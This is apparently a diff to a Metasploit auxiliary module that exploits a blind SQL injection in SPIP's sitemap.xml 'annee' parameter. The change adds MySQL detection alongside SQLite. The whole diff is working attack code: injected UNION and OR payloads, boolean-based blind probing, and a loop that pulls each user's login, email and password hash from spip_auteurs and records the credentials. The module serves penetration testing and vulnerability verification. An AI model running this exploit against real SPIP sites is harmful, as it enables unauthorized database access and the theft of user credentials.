@@ -63,6 +63,23 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
+  def sqlite_sqli(baseline_count)
+    create_sqli(dbms: Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind) do |payload|
+      res = sitemap_inject("UNION SELECT 1,2,3,4,5,6 FROM spip_auteurs WHERE sqlite_version() IS NOT NULL AND (#{payload})")
+
+      res.body.scan('<url>').length > baseline_count
+    end
+  end
+
+  def mysql_sqli(baseline_count)
+    create_sqli(dbms: Msf::Exploit::SQLi::MySQLi::BooleanBasedBlind) do |payload|
+      res = sitemap_inject("OR (#{payload})")
+      next false unless res&.body
+
+      res.body.scan('<url>').length > baseline_count
+    end
+  end
+
   def run_host(_ip)
     rversion = spip_version || spip_plugin_version('spip')
     if rversion
@@ -77,16 +94,15 @@ class MetasploitModule < Msf::Auxiliary
 
     baseline_count = baseline_res.body.scan('<url>').length
 
-    @sqli = create_sqli(dbms: Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind) do |payload|
-      res = sitemap_inject("UNION SELECT 1,2,3,4,5,6 FROM spip_auteurs WHERE #{payload}")
-      next false unless res&.body
-
-      res.body.scan('<url>').length > baseline_count
-    end
-
     print_status('Verifying blind SQLi via sitemap.xml annee parameter...')
-    unless @sqli.test_vulnerable
-      fail_with(Failure::NotVulnerable, 'Boolean blind SQLi test failed')
+    sqli = sqlite_sqli(baseline_count)
+    if sqli.test_vulnerable
+      print_status('SQLite database detected')
+    else
+      sqli = mysql_sqli(baseline_count)
+      fail_with(Failure::NotVulnerable, 'Boolean blind SQLi test failed; MySQL targets require at least one published article') unless sqli.test_vulnerable
+
+      print_status('MySQL database detected')
     end
     print_good('Blind SQLi confirmed!')
 
@@ -94,19 +110,19 @@ class MetasploitModule < Msf::Auxiliary
     start_id = datastore['ID_AUTEUR']
 
     (start_id..(start_id + max_users - 1)).each do |uid|
-      unless @sqli.blind_request("(SELECT COUNT(*) FROM spip_auteurs WHERE id_auteur=#{uid})=1")
+      unless sqli.blind_request("(SELECT COUNT(*) FROM spip_auteurs WHERE id_auteur=#{uid})=1")
         print_status("No user with id_auteur=#{uid}, skipping")
         next
       end
 
-      login = @sqli.run_sql("(SELECT login FROM spip_auteurs WHERE id_auteur=#{uid})")
+      login = sqli.run_sql("(SELECT login FROM spip_auteurs WHERE id_auteur=#{uid})")
       print_good("  Login: #{login}")
 
-      email = @sqli.run_sql("(SELECT email FROM spip_auteurs WHERE id_auteur=#{uid})")
+      email = sqli.run_sql("(SELECT email FROM spip_auteurs WHERE id_auteur=#{uid})")
       print_good("  Email: #{email}")
 
       print_status('  Extracting password hash (this takes a moment)...')
-      pass = @sqli.run_sql("(SELECT pass FROM spip_auteurs WHERE id_auteur=#{uid})")
+      pass = sqli.run_sql("(SELECT pass FROM spip_auteurs WHERE id_auteur=#{uid})")
       print_good("  Hash:  #{pass}")
 
       report_cred(login, pass) unless pass.to_s.empty?
